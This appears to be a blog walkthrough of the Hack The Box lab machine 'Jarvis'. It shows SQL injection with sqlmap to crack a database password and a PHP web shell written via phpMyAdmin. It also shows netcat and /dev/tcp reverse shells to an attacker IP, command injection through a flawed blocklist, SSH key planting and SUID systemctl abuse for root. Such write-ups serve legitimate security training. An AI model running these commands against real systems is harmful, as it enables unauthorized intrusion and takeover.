---
layout: post
title: Hackthebox - Jarvis | Walkthrough
date: 2019-11-10
Author: Dark0
tags: [sample, document]
toc: 
pinned: true
---

#### Hello guys! Welcome to yet another from hackthebox walkthrough. The new box retired is Jarvis, so we'll solve it. Jarvis is a box classified at a medium level. With Jarvis we learn some skills related to the sqli and binary setuid exploit. Ok, let's go

## Penetration Methodologies

* **Scanning**

   + _nmap_
       
* **Enumeration**

   + _Browsing HTTP server_
   + _Directory Scanning using dirb_
   + _Getting creds with SQLi_

* **Exploitation**

  * **User**

   + _RCE phpmyadmin_
   + _Command injection_

  * **Root**
   
   + _SETUID binary_   
_____________________________________________________________________________________________________________________________

## Scanning

#### To begin with, I've done the first scan with the nmap, we found two ports: 22 to ssh and 80 to web service. Good, here we go.

```
┌─[root@parrot]─[~]
└──╼ #nmap -T4 -A jarvis.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-10 02:19 -03
Nmap scan report for jarvis.htb (10.10.10.143)
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

```
______________________________________________________________________________________________________________________________

## Enumeration

#### Good, port 80 we get it web page, looks like a page of the hotel, maybe if we'll browse in the page we'll find something interesting

![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2003-15-33.png)

#### with a little search in the page, I found a suspect link and decided to try to force SQL with a single quote and received a weird result...

![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/quartos.png)


#### I've used the dirb to enumerate directories, but dirbuster and gobuster would work too. We see that the dirb found some pages, that's good. But the page what we interested to is `/phpmyadmin`

![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2002-19-10.png)

#### I used the sqlmap to dump the users and passwords hashes, the `--passwords` flag is for that

``sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" --passwords``

```
[04:27:04] [INFO] fetching database users password hashes
[04:27:04] [INFO] fetching database users
[04:27:04] [INFO] fetching number of database users
[04:27:04] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[04:27:04] [INFO] retrieved: 1
[04:27:05] [INFO] retrieved: 'DBadmin'@'localhost'
[04:27:26] [INFO] fetching number of password hashes for user 'DBadmin'
[04:27:26] [INFO] retrieved: 1
[04:27:27] [INFO] fetching password hashes for user 'DBadmin'
[04:27:27] [INFO] retrieved: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[04:33:12] [INFO] writing hashes to a temporary file '/tmp/sqlmapNCB3gB4320/sqlmaphashes-u13BSC.txt' 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
[04:33:16] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[04:33:19] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[04:33:22] [INFO] starting dictionary-based cracking (mysql_passwd)
[04:33:22] [INFO] starting 4 processes 
[04:33:25] [INFO] cracked password 'imissyou' for user 'DBadmin'                                                                                                                             
database management system users password hashes:                                                                                                                                            
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou
```

#### User and password found: (DBadmin: imissyou), Let's try login in PHPMyAdmin

______________________________________________________________________________________________________________________________

## EXPLOITATION

   > USER

#### We've access to the PHPMyAdmin. Now, we'll put a shell in server to get RCE. To that, we should go to "New" and after "SQL"

![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/phpmyadmin.png)

#### This code will create one archive with the name "shell.php" inside the directory "/var/www/html"
#### ``SELECT "<?php system($_GET['Dark0']); ?>" into outfile "/var/www/html/shell.php"``   
   
![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2005-04-04.png)  

#### we've got RCE. but, we can get shell with netcat. Our parameter is "Dark0" after the equal, we can writing commands. 
``nc -e /bin/bash 10.10.14.50 1337`` 

#### And nc listening in my terminal 
``nc -nlvp 1337``

![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/RCE.png)

#### We've got shell www-data. I used the python to spawn tty shell
``python -c 'import pty;pty.spawn("/bin/bash")'``

![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/shell.png)

#### When we use ``sudo -l``, we see a script running as user pepper

``(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py``

```
www-data@jarvis:/var/www/html$ sudo -l     
sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/var/www/html$ 
```

#### Analyzing the simpler.py script code I realized that it has an interesting snippet

```
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()
	
    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1
	
    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
	
def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req
			
def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]
	
def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req
	
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

#### The exec_ping function is interesting because it doesn't check ``$``. Then you can execute commands by passing ``$(command)``

```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
    
```

#### Using the command you can test a ping
``sudo -u pepper /var/www/Admin-Utilities/simpler.py -p``

#### However, instead of putting the IP I put ``$(/bin/bash)`` and get shell pepper, But I wasn't getting feedback when giving commands

```
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
<do -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(/bin/bash)
$(/bin/bash)
pepper@jarvis:/var/www/Admin-Utilities$ ls
ls
pepper@jarvis:/var/www/Admin-Utilities$ whoami
whoami
pepper@jarvis:/var/www/Admin-Utilities$ 
```
#### So i made nc shell again this time it worked; we got user!!

```
pepper@jarvis:~$ cat user.txt
cat user.txt
2afa36c4f05b37b34259c93551f5c44f
pepper@jarvis:~$ 
```
______________________________________________________________________________________________________________________________

### PRIVILEGE SCALATION

   > ROOT
   
#### Looking for setuid
``find / -perm -4000 2>/dev/null  ``

```
pepper@jarvis:/$ find / -perm -4000 2>/dev/null     
find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

#### I created my ssh key and put it in authorized_keys if you don't know:
#### Creating the key: ``ssh-keygen -P "" -f``
#### Inside the target machine's .ssh folder you will put your public key inside the authorized_keys file
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzDnPGsGNdRWfXR/PXh21mgGlToBQcV7uOjIdv+zqlrCv8WOgygVGuXC2ijqyjYiKSyFCZMxnFtST8BIDilbN9elWDYivfu1KjA1WXd1ahzlZcWkgony6XJAIQlaEhwuOwt2XjA+Ex5/YVtP8Xaf+TljxUaF5oXjyLeTTBQZEQfcd2PbSvJF8izy5FtiFB8HlGhE23IHysSEcvjv+IGzEhzCkgXLCOasb0zfhmxuwen+9/NpucYf48ywRRzo3tTIsybnA/Wi4j8IIIMjPJBjjVsYbiw+MimMgloXzVCP+z6PfX/6bN6wU7oK5vvW6IFrnDxouAMZEIUKQTicwCzZYz root@parrot" >> authorized_keys
```

#### Let's explore systemctl to get root, Doing a quick search we found the GTFObins page with the exploit method for systemctl

> https://gtfobins.github.io/gtfobins/systemctl/

#### In "ExecStart" I put my shell and executed line by line
``ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.50/777 0>&1"``

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.50/777 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF

```
#### After executing line by line we have root

```
root@jarvis:/# cat /root/root.txt
cat /root/root.txt
d41d8cd98f00b204e9800998ecf84271
root@jarvis:/# 
```

#### Your feedback will be interesting.











